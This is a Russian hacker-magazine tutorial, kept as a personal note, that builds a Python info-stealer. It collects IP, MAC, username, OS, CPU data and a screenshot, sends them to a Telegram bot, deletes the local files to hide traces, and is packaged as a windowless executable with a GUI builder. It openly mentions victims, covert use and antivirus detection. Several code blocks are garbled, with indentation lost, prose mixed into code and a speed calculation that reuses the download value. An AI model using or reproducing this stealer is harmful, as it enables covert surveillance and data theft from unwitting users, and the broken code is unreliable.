---
title: 20230120150321 
tags: python
author: Easy.Quest
source: 
---
# Разведка змеем. Собираем информацию о системе с помощью Python

Содержание статьи

-   [[#Инструменты]]
-   [[#Задачи]]
-   [[#Создаем основу программы]]
-   [[#Сбор данных]]
-   [[#Скорость интернет-соединения]]
-   Часовой пояс и время
-   Частота процессора
-   Скриншот рабочего стола
-   Запись в файл
-   Отправка данных
-   Собираем программу
-   Пишем сборщик с графическим интерфейсом
-   Вывод


> Чтобы просто посмотреть IP-адрес и другие настройки сети, тебе придется обратиться к командной строке и выполнить команду `ipconfig /all`. Ситуация одна из самых частых для эникейщиков и удаленных шаманов, но она хотя бы быстро решаема. Но если придется собирать более серьезный набор информации о машине, с которой сейчас будешь работать, — без автоматизации не обойтись. 

**Этим мы сегодня и займемся.**

Имей в виду, что эта программа может использоваться как для быстрого сбора информации о своей системе, так и для кражи идентифицирующей информации с компьютера жертвы. Мы граждане законопослушные, поэтому пусть это и не пароли, но, чтобы не раздражать правоохранителей, все тесты будут проводиться на изолированных виртуальных машинах.

**warning**

> **Несанкционированный доступ к компьютерной информации —  преступление. Ни автор, ни редакция журнала не несут  ответственности за твои действия.**

 
### Инструменты

- Сначала давай разберемся, где будем писать код. Можно кодить в обычном виндовом «Блокноте», но мы воспользуемся специальной IDE для Python — PyCharm. Установка и настройка просты как два рубля: скачал установщик, запустил — и кликай себе «Далее», пока есть такая кнопка. 
- Еще нам потребуется Python. Я буду использовать версию 3.9.0 — с ней точно все работает. 
 

### Задачи

Давай сначала обрисуем, что мы вообще планируем делать. Я планирую собирать следующую информацию:

1.  IP-адрес.
2.  MAC-адрес.
3.  Имя пользователя.
4.  Тип операционной системы.
5.  Скорость работы системы.
6.  Время.
7.  Скриншот.
8.  Скорость интернет‑соединения.
9.  Модель процессора.

И отправляться это все будет прямиком тебе в телегу через специальный бот.

#### **Зачем?**

Наверняка у тебя возник вопрос: зачем может понадобиться MAC-адрес или модель процессора? Эти параметры меняются очень и очень редко, так что прекрасно подходят для фингерпринтинга. Даже если пользователь купит более быстрый интернет‑канал или поменяет часовой пояс, ты без особого труда сможешь определить, что уже имел дело с этим компьютером. Стоит помнить, что ровно такие же методы используют хитрые рекламщики для идентификации пользователей, да и разработчики триальных версий программ тоже. Эта статья поможет чуть лучше понять, что можно узнать о твоем компьютере в полностью автоматическом режиме, а как применить эту информацию — решать только тебе.

В этой статье мы не будем показывать, как сформировать устойчивый к незначительным изменениям идентификатор, который поможет однозначно определить конкретный компьютер. Если тебе станет интересно — пиши в комментариях, и, возможно, мы сделаем большой гайд на эту тему!


### Создаем основу программы

Для отправки данных я решил воспользоваться Telegram-ботом. Создать его ты можешь через BotFather, а после сохранить token твоего творения. Публиковать его нельзя — любой, кто получит этот токен, сможет захватить контроль над твоим ботом.

Для подключения к Bot API «телеги» нужны всего две строчки:

```python
import telebot

bot = telebot.TeleBot("token from BotFather") # Подключение бота
```

Чтобы оценить быстродействие, можно написать еще пару строк. Весь дальнейший код расположим между ними. Описанное выше подключение бота уже вписано сюда.

```python
import telebot
from datetime import datetime

bot = telebot.TeleBot("token")
start = datetime.now()  # Начало отсчета

# Сюда поместим нашу основу, поэтому оставляем место

ends = datetime.now()  # Конец отсчета
workspeed = format(ends - start)  # Вычисление времени
```

Теперь перейдем собственно к сбору данных.


### Сбор данных

Я не буду долго ходить вокруг да около и сраnзу начну разбирать секцию импорта.

```python
import getpass
import os
import socket
from datetime import datetime
from uuid import getnode as get_mac
import pyautogui
from speedtest import Speedtest
import telebot
import psutil
import platform
from PIL import Image
```

Теперь кратко рассмотрим, что делает каждый модуль. Если какие‑то функции тебе не нужны, выброси строку импорта модуля и код, который использует этот модуль. Все просто!

Итак, за работу с ОС и локальными ресурсами отвечают эти четыре модуля:

-   **getpass** нужен для определения информации о пользователе;
-   **os** используем для взаимодействия с функциями ОС, вроде вызова внешних исполняемых файлов;
-   **psutil** работает с некоторыми низкоуровневыми системными функциями;
-   **platform** предоставит информацию об ОС.

Этими модулями реализованы сетевые взаимодействия:

-   **socket** — для работы с сокетами и получения IP-адресов;
-   **getnode** получает MAC-адрес машины;
-   **speedtest** замеряет характеристики интернет‑соединения;
-   **telebot** сделает всю рутину по работе с Telegram-ботом.

Служебные примочки, которые трудно отнести к категориям выше:

-   **datetime** позволит определить время работы программы;
-   **pyautogui** ~~быстро и без боли~~ работает с GUI;
-   **PIL.Image** — для снятия скриншота.

После этого нам требуется узнать основные стабильные характеристики системы: IP- и MAC-адреса, имя пользователя и ОС:


```python
name = getpass.getuser() # Имя пользователя

ip = socket.gethostbyname(socket.getfqdn()) # IP-адрес системы

mac = get_mac() # MAC адрес

ost = platform.uname() # Название операционной системы
```

Строки кода снабжены комментариями и в пояснениях не нуждаются.

 

### Скорость интернет-соединения

```python
from speedtest import Speedtest  # Импорт модуля. Рассматривался выше

inet = Speedtest()

download = (
    float(
        str(inet.download())[0:2]
        + "."  # Входящая скорость
        + str(round(inet.download(), 2))[1]
    )
    * 0.125
)

uploads = (
    float(
        str(inet.upload())[0:2]
        + "."  # Исходящая скорость
        + str(round(inet.download(), 2))[1]
    )
    * 0.125
)
```

Скорость замеряется библиотекой сервиса Speedtest.net и, соответственно, выдает результат в мегабитах, а не мегабайтах. Чтобы это исправить, разделим численный результат на 8 или умножим на 0,125 — это одно и то же. Манипуляцию проделываем дважды — для входящей и исходящей скорости.

Важно понимать, что замер не претендует на сверхточность, потому что мы никак не можем легко проверить, какую часть канала потребляют другие программы или даже другие устройства в сети. Если ты подключился к рабочей станции удаленно, твое соединение тоже что‑то будет потреблять. В программе поправка на это не реализована из‑за ее слишком низкой точности и трудоемкости.
 

### Часовой пояс и время

```python
import psutil

zone = psutil.boot_time() # Узнает время, заданное на компьютере

time = datetime.fromtimestamp(zone) # Переводит данные в читаемый вид
```

Если ты настраиваешь чей‑то сервер или слишком удаленный
компьютер, время может отличаться. Ко всем прочим данным добавим
и показания часов — информация лишней не бывает. Если ты не знал,
неправильно выставленное время и/или часовой пояс может вызывать
сбои при подключении к сайтам, использующим HTTPS, а этот кусочек
кода позволит легко выявить такие проблемы.

 

### Частота процессора

```python
import psutil

cpu = psutil.cpu_freq()
```

Может помочь выявить причину тормознутости компьютера: если
процессор постоянно молотит на полную, но программы виснут —
процессор устарел, а если простаивает — виновата программа. Да и
просто общее представление о железе дает.

**Более глубокий фингерпринтинг**

В этой статье умышленно не рассказывается, как получить
идентификатор жесткого диска или GUID установленной Windows: мы
не методичку для рекламщиков пишем, а программировать
тренируемся. Тем не менее ты легко можешь добавить сбор и такой
информации, воспользовавшись консольной утилитой wmic. Ее вывод
можно парсить с помощью Python-скрипта, так что даже не придется
писать лишние обвязки. На скриншоте пример получения серийного
номера BIOS.

[]

Другие статьи в выпуске: []

Xakep #262. ROPETWO

-   Содержание выпуска
-   Подписка на «Хакер»

 

### Скриншот рабочего стола

```python
os.getcwd()

try: # Перехват ошибки в случае неверно указанного расположения

os.chdir(r"/temp/path")

except OSError:

@bot.message_handler(commands=['start'])

def start_message(message): # Служебная обвязка для бота

bot.send_message(message.chat.id, "[Error]: Location not found!")

bot.stop_polling()

bot.polling()

raise SystemExit

screen = pyautogui.screenshot("screenshot.jpg") # Снятие скриншота
```

Тут все тоже максимально просто, а за собственно снятие скриншота
отвечает только последняя строка кода. Остальное мы используем
для корректной обработки входящей команды бота.

 

### Запись в файл

Теперь, когда все готово, мы можем приступать к финальному сбору
и отправке данных. Создаем готовый файл с нашими данными: если
использовался максимальный сбор информации, а точнее весь код
выше, то используем такую запись, в противном случае убирай
ненужные тебе данные:

```python
try: # Обвязка для обработки команд боту

os.chdir(r"/temp/path")

except OSError:

@bot.message_handler(commands=['start'])

def start_message(message):

bot.send_message(message.chat.id, "[Error]: Location not found!")

bot.stop_polling()

bot.polling()

raise SystemExit

file = open("info.txt", "w") # Открываем файл

file.write(f"[================================================]\n
Operating System: {ost.system}\n Processor: {ost.processor}\n Username:
{name}\n IP adress: {ip}\n MAC adress: {mac}\n Timezone:
{time.year}/{time.month}/{time.day}
{time.hour}:{time.minute}:{time.second}\n Work speed: {workspeed}\n
Download: {download} MB/s\n Upload: {uploads} MB/s\n Max Frequency:
{cpu.max:.2f} Mhz\n Min Frequency: {cpu.min:.2f} Mhz\n Current
Frequency: {cpu.current:.2f}
Mhz\n[================================================]\n") # Пишем

file.close() # Закрываем
```

Длинный, но легко читаемый код. Первая его часть обеспечивает
обработку команды /start, вторая — запись всех данных в файл.
Результат попадет в info.txt, но путь, конечно, можно изменить
прямо в коде.

Дело остается за малым — отправить результат в Telegram.

 

### Отправка данных

Теперь дополним код выше, чтобы он еще и файлы отправлял.

```python
text = "Screenshot" # Требуется при создании скриншота (текст к фото)

@bot.message_handler(commands=['start']) # Выполняет действия при
команде start

def start_message(message):

upfile = open("Путь до файла\info.txt", "rb") # Читает файлы

uphoto = open("Путь до файла\screenshot.jpg", "rb")

bot.send_photo(message.chat.id, uphoto, text) # Отправляет данные

bot.send_document(message.chat.id, upfile)

upfile.close() # Закрывает файлы (обязательно)

uphoto.close()

os.remove("info.txt") # Удаляет файлы, чтобы не оставлять следы

os.remove("screenshot.jpg")

bot.stop_polling() # Закрывает соединение после отправки

bot.polling() # Создает соединение с ботом
```

Сначала указывается подпись к скриншоту, потом читаем
и отправляем файлы в виде фото и документа, затем зачищаем следы
и закрываем соединение с ботом. Ничего сложного!

Естественно, если нам не нужен, к примеру, скриншот, мы можем
вырезать код его отправки, получив такой вариант:

```python
@bot.message_handler(commands=['start'])

def start_message(message):

upfile = open("Путь до файла\info.txt", "rb")

bot.send_document(message.chat.id, upfile)

upfile.close()

os.remove("info.txt")

bot.stop_polling()

bot.polling()

info
```

Чтобы бот гарантированно отправлял все сообщения тебе, укажи
вместо message.chat.id ID чата с собой. Его можно узнать через бот
GetMyID.

Также следует учесть одну деталь: перед запуском программы ты
должен отправить своему боту команду /start, чтобы он понял, кому
следует отправлять данные.

 

### Собираем программу

Чтобы не тянуть с собой на другой компьютер Python и зависимости
программы, давай упакуем все в один исполняемый файлик. Делается
это с помощью PyInstaller, который ставится простой командой

```sh
pip install pyinstaller
```

Переходим с помощью командной строки в папку с нашей программой
и собираем ее командой

```sh
pyinstaller -i путь_до_иконки --onefile наш_файл.py
```

Аргумент --onefile заставит PyInstaller упаковать все
в единственный файл. После -i надо указать путь до иконки
исполняемого файла, если ты хочешь ее использовать. Если она
не нужна, просто удали этот аргумент. Последним идет путь к файлу
с нашим кодом. Если ты не хочешь, чтобы при запуске появлялась
консоль (например, если владелец компьютера не знает, что ты
собрался ему помочь :D), поменяй расширение входного файла с кодом
на .pyw или укажи опцию -w.

Не забывай проверять наличие модулей и их обновлений, чтобы избежать
ошибок. Временный путь можно указать любой, но лично я указываю
C:\Temp. Само собой, если обнаружена ОС на базе Linux, то этот код
придется поправить.

Еще следует проверить, как сильно и чем детектится наш файл. Чтобы
тебе не лезть на VirusTotal, я сделал это сам.

[Результат сканирования на VirusTotal]

www

Полный код проекта я разместил на GitHub. Там есть
и программа‑сборщик, о которой я расскажу ниже.

 

### Пишем сборщик с графическим интерфейсом

Для создания GUI сборщика нам придется работать с библиотекой
Tkinter, поэтому прежде всего импортируем ее и нужные элементы:

```python
# -*- coding: utf-8 -*- # Не забываем указывать конфигурацию

from tkinter import * # Сама библиотека для работы

from tkinter import messagebox as mb # Функция для создания окон с
информацией

После этого нужно создать окно, которое и будет основой
интерфейса:

root = Tk()

root.title("Tkinter") # Название программы

root.geometry("300x400") # Разрешение окна программы

Нам нужен только ввод API-ключа для доступа к боту. Делается такой
ввод кодом ниже:

text = Label(root, text="Telegram bot token") # Текст для обозначения
поля

text.grid(padx=100, pady=0) # Расположение по x/y

API = Entry(root, width=20) # Создание поля ввода данных

API.grid(padx=100, pady=0)
```

Это создаст два графических объекта — поле ввода и подпись к нему.

В этом интерфейсе не хватает кнопки для сборки выходного файла.
Давай создадим ее:

```python
button = Button(root, text="Create", command=clicked, height=2,
width=10)

button.grid(padx=100, pady=0)
```

Создаем функцию, которая должна находиться в файле после импорта
библиотек. В ней мы должны создавать файл и записывать в него код
полезной нагрузки.

```python
def clicked():

system = open("source.py", "w")

system.write('''

# Сюда перемещаем полный код программы, которую мы писали раньше

''')

system.close()
```

**warning**

Не шути с пробелами! Перед тем как вставлять код, убедись, что там
нет лишних пробелов, иначе может возникнуть трудно обнаружимая
ошибка.

Но на этом наша функция не заканчивается, так как нужно дать
пользователю понять, готов ли файл. Делаем это с помощью MessageBox:

```python
if API.get() or direct.get() == "":

mb.showwarning("WARNING", "There are empty fields")

else:

mb.showinfo("INFO", "The system.py file is ready!")
```

Теперь осталось только запустить отрисовку и обработку
сообщений строкой root.mainloop().

Опционально можно собрать и сборочный интерфейс. Для этого
используем старый добрый PyInstaller:

```sh
pyinstaller -F -w --onefile программа.py
```

И все готово! Теперь ты имеешь полноценную программу для сбора
данных о системе и ее сборщик, который ускорит процесс работы.

Каждый раз прибегать к PyInstaller, чтобы собрать программу,
не слишком удобно. Можно воспользоваться модулем os и вызывать
PyInstaller автоматически.

```python
import os

os.system("pyinstaller --onefile наш_файл.py") # Сборка выходногобинарника

os.rmdir("build")

os.rmdir("__pycache__")

os.remove("system.py")

os.remove("system.spec")
```

Если тебе понадобилась иконка, можно добавить в команду сборки
параметр -i file.ico, а для сборки «невидимой» программы дописать
-w — ровно как при ручной сборке!

 

### Вывод

В этой статье мы разобрали от начала и до конца, как вытащить[[
из своей или чужой системы неы]]е важные данные — от IP
до модели процессора. Конечно, главное тут в том, что ты научился
хоть немного писать код самостоятельно — а применить всегда
куда‑нибудь получится. Если заинтересовался программированием
на Python — почитай нашу статью о написании простого вируса, она
станет отличным закреплением навыков программирования. Успехов!